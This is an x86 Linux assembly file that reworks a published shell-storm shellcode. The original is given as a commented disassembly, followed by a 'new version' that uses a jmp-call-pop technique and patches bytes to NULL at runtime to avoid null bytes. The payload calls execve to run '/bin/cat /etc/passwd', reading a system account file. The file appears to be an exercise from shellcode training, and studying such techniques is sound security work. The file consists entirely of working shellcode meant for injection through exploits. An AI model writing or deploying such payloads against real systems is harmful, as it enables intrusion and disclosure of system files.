;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Original shellcode                                       ;
; http://shell-storm.org/shellcode/files/shellcode-571.php ;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Original shellcode code (Ndisasm)                        ;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; 00000000  31C0              xor eax,eax                  ;
; 00000002  99                cdq                          ;
; 00000003  52                push edx                     ;
; 00000004  682F636174        push dword 0x7461632f        ;
; 00000009  682F62696E        push dword 0x6e69622f        ;
; 0000000E  89E3              mov ebx,esp                  ;
; 00000010  52                push edx                     ;
; 00000011  6873737764        push dword 0x64777373        ;
; 00000016  682F2F7061        push dword 0x61702f2f        ;
; 0000001B  682F657463        push dword 0x6374652f        ;
; 00000020  89E1              mov ecx,esp                  ;
; 00000022  B00B              mov al,0xb                   ;
; 00000024  52                push edx                     ;
; 00000025  51                push ecx                     ;
; 00000026  53                push ebx                     ;
; 00000027  89E1              mov ecx,esp                  ;
; 00000029  CD80              int 0x80                     ;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Size = 43 Bytes                                          ;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; New version                                              ;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
global _start

_start:
	jmp short _call

_pop:
	xor eax, eax             ; initialize eax register
	mov edx, eax             ; initialize edx

	pop ebx                  ; /bin/cat
	
	mov byte [ebx+0x8], al   ; update 0xff with NULL
	mov byte [ebx+0x14], al  ; update 0xff with NULL

	lea ecx, [ebx+0x9]       ; place ecx to /etc/passwd

	; replace push instructions
	push eax                 ; NULL (EOF Argv)
	push ecx                 ; */etc/passwd
	push ebx                 ; */bin/cat	   

	mov ecx, esp             ; **/bin/cat

	add al, 0xb              ; equal to mov al, 0xb. execve() syscall

	int 0x80                 ; call syscall()
_call:
	call _pop

	; /bin/cat /etc/passwd
	spell: db 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x63, 0x61, 0x74, 0xff, 0x2f, 0x65, 0x74, 0x63, 0x2f, 0x70, 0x61, 0x73, 0x73, 0x77, 0x64, 0xff

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Size = 51 Bytes                                          ;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
